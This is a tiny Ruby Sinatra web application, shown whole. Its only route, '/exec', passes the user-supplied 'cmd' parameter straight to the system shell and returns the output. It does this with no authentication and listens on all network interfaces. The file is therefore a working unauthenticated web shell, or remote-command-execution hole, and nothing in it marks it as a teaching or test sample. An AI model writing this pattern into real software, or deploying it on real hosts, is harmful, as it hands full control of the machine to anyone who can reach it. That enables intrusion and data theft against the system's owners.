require 'sinatra'

get '/exec' do
  command = params[:cmd]
  result = `#{command}`
  "Command output: #{result}"
end

set :bind, '0.0.0.0'
set :port, 4567
